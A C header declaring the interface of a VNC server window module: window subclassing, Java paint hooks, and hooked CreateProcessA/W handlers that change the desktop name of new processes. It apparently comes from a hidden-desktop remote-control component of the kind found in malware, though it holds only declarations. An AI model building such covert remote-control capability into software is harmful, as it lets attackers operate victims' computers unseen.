#ifndef __VNCWND_H_
#define __VNCWND_H_

#define VMR_IQOK 0xDEADC0DE

typedef struct _JavaPaintHook
{
	HANDLE hMutex;
	HWND hWnd;
	HDC hDC;
	HBITMAP hBitmap;
	struct _JavaPaintHook *next;
	BOOL UpdateViewPort;
}JavaPaintHook;

typedef struct _WNDS_LIST_ITEM
{
	HWND hWnd;
	struct _WNDS_LIST_ITEM *lpNext;
}WNDS_LIST_ITEM,*PWNDS_LIST_ITEM;

JavaPaintHook* AllocateJavaHook( HWND hWnd , HDC hDC, DWORD dwHeight, DWORD dwWidth, BOOL UpdateViewPort );
JavaPaintHook* LookupJavaHook( HWND hWnd );

BOOL VncWndInitialize( PVNC_SESSION pSession );
VOID VncWndRelease( PVNC_SESSION pSession );

BOOL 
	VncSrvSubclassWindow( 
		PVNC_SESSION pSession, 
		HWND hWnd,
		BOOL bIsDialog
		);

BOOL 
	VncSrvSubclassWindowA( 
		PVNC_SESSION pSession, 
		HWND hWnd,
		LPCSTR szClassName
		);

BOOL 
	VncSrvSubclassWindowW( 
		PVNC_SESSION pSession, 
		HWND hWnd,
		LPCWSTR szClassName
		);

BOOL 
	VncSrvUnsubclassWindow( 
		PVNC_SESSION pSession, 
		HWND hWnd,
		BOOL ResetWndProc
		);

LRESULT HandleVNCMsg(HWND hWnd,WPARAM wParam,LPARAM lParam);
LRESULT EraseBkg(HWND hWnd,WPARAM wParam);
void FixMessage ( BOOL r, LPMSG Msg );

BOOL CALLBACK ResetClassStyle(PVNC_SESSION pSession,HWND hWnd);

BOOL IsTranslateMessageUsed(HWND hWnd);
VOID AppendWnd(HWND hWnd);
BOOL VncSrvTestIQ( PVNC_SESSION pSession, HWND hWnd );
LRESULT CALLBACK VncSrvWndProc(int nCode,WPARAM wParam,LPARAM lParam);
LRESULT CALLBACK VncSrvCallWndProc(int nCode,WPARAM wParam,LPARAM lParam);


LPWSTR	WINAPI	VncChangeDesktopNameW(LPSTARTUPINFOW lpStartupInfo);
LPSTR	WINAPI	VncChangeDesktopNameA(LPSTARTUPINFOA lpStartupInfo);

BOOL WINAPI VncOnCreateProcessA(
	LPSTR lpApplicationName,
	LPSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPSTR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);


BOOL WINAPI VncOnCreateProcessW(
	LPWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);



BOOL VncWndInitialize( PVNC_SESSION pSession );

#endif // __VNCWND_H_
